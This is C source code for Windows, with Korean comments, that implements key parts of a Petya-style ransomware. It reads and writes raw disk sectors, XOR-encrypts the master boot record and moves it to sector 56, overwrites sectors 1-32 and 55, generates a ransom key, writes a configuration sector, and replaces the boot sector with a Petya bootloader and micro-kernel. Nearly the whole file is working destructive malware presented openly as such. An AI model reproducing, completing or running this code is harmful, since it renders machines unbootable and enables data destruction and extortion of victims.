#include <Windows.h>
#include "misc.h"

// 특정 섹션에 실행, 읽기, 쓰기 권한을 부여
#pragma section(".xxxx", execute, read, write)
#pragma code_seg(".xxxx")

// Petya 랜섬웨어의 디스크 섹터 읽기 기능
// MBR 또는 다른 중요한 데이터 영역을 읽어 분석하거나 백업 가능
BOOL PetyaReadSector(HANDLE hHandle, INT iSectorCount, CHAR* cBuffer) {
    DWORD lpTemporary;

    // 디스크의 특정 섹터로 파일 포인터 이동
    if (SetFilePointer(hHandle, iSectorCount * 512, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
        return FALSE;

    // 디스크 섹터 읽기
    if (!ReadFile(hHandle, cBuffer, 512, &lpTemporary, 0))
        return FALSE;

    return TRUE;
}

// Petya 랜섬웨어의 디스크 섹터 쓰기 기능
// MBR이나 특정 섹터를 덮어씀으로써 부팅 불가 상태를 만들거나 데이터를 손상 가능
BOOL PetyaWriteSector(HANDLE hHandle, INT iSectorCount, CHAR* cBuffer, DWORD nBytesToWrite /* 항상 512바이트 */) {
    DWORD lpTemporary;

    // 디스크의 특정 섹터로 파일 포인터 이동
    if (SetFilePointer(hHandle, iSectorCount * 512, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
        return FALSE;

    // 디스크 섹터 쓰기
    if (!WriteFile(hHandle, cBuffer, nBytesToWrite, &lpTemporary, 0))
        return FALSE;

    return TRUE;
}

// XOR 암호화 함수
PCHAR PetyaXor(PCHAR pcData, CHAR cKey, INT iLenght) {
    CHAR* Output = (CHAR*)VirtualAlloc(0, sizeof(CHAR) * iLenght, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // XOR 수행
    for (INT i = 0; i < iLenght; ++i)
        Output[i] = pcData[i] ^ cKey;

    return Output;
}

// MBR 백업 및 암호화
// 기존 MBR을 암호화 후 섹터 56에 저장, 복구가 어렵게 함
VOID PetyaBackupMBR() {
    PCHAR BootSector = (PCHAR)VirtualAlloc(0, 512, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD lpTemporary = 0;

    // MBR 읽기
    PetyaReadSector(hHard, 0, BootSector);

    // XOR 암호화로 MBR 암호화
    PCHAR EncryptedBootSector = (PCHAR)VirtualAlloc(0, 512, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    EncryptedBootSector = PetyaXor(BootSector, 0x37, 512);

    // 암호화된 MBR을 섹터 56에 저장 (백업)
    PetyaWriteSector(hHard, 56, EncryptedBootSector, 512);

    VirtualFree(EncryptedBootSector, 512, MEM_RELEASE);
    VirtualFree(BootSector, 512, MEM_RELEASE);
}

// 디스크의 빈 섹터를 특정 값으로 채우기 (0x37)
VOID PetyaFillEmptySectors() {
    DWORD lpTemporary = 0;

    // 512바이트 크기의 0x37로 채워진 버퍼 생성
    BYTE Fill37[512];
    for (INT i = 0; i < 512; i++)
        Fill37[i] = 0x37;

    // 1~32번 섹터를 0x37로 덮어씀
    for (INT i = 1; i < 33; ++i)
        PetyaWriteSector(hHard, i, Fill37, 512);

    // 섹터 55에도 덮어쓰기 (검증용?)
    PetyaWriteSector(hHard, 55, Fill37, 512);
}

// 사용자 지정 키를 암호화된 형태로 변환
BOOLEAN encode(char* key, BYTE* encoded) {
    if (!key || !encoded) {
        MessageBox(0, "Invalid buffer", "Error", 0);
        return FALSE;
    }

    size_t len = strlen(key);
    if (len < 16) {
        MessageBox(0, "Invalid key", "Error", 0);
        return FALSE;
    }
    if (len > 16) len = 16;

    int i, j;
    for (i = 0, j = 0; i < len; i++, j += 2) {
        char k = key[i];

        encoded[j] = k + 'z';       // 첫 번째 방식으로 암호화
        encoded[j + 1] = k * 2;    // 두 번째 방식으로 암호화
    }
    encoded[j] = 0;
    encoded[j + 1] = 0;
    return TRUE;
}

// 랜섬웨어의 주요 랜덤 키 생성 (16자)
VOID GenerateRandomKey(CHAR* generate) {
    for (int i = 0; i < 16; i++)
        generate[i] = kPetyaCharset[random() % strlen(kPetyaCharset)];
    generate[16] = 0;
}

// 설정 섹터에 랜섬웨어 정보를 저장
VOID PetyaConfigurationSector() {
    DWORD lpTemporary = 0;

    PetyaSectorData* Dawger = (PetyaSectorData*)VirtualAlloc(0, sizeof(PetyaSectorData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 암호화 키 생성 및 설정
    CHAR EncryptedKey[16];
    GenerateRandomKey(EncryptedKey);
    MessageBox(0, EncryptedKey, "Decryption key", 0); // 복호화 키를 메시지로 출력 (테스트용)

    // 섹터 54에 데이터 저장
    PetyaWriteSector(hHard, 54, Dawger, 512);

    VirtualFree(Dawger, 0, MEM_RELEASE);
}

// 부트로더 삽입
VOID PetyaInsertMicroKernel() {
    BYTE PartitionTable[512];
    PetyaReadSector(hHard, 0, PartitionTable);

    // Petya 부트로더 삽입
    PetyaWriteSector(hHard, 0, Bootloader, 512);
    PetyaWriteSector(hHard, MicroKernelStartingSector, MicroKernel, MicroKernelSectorLenght * 512);
}
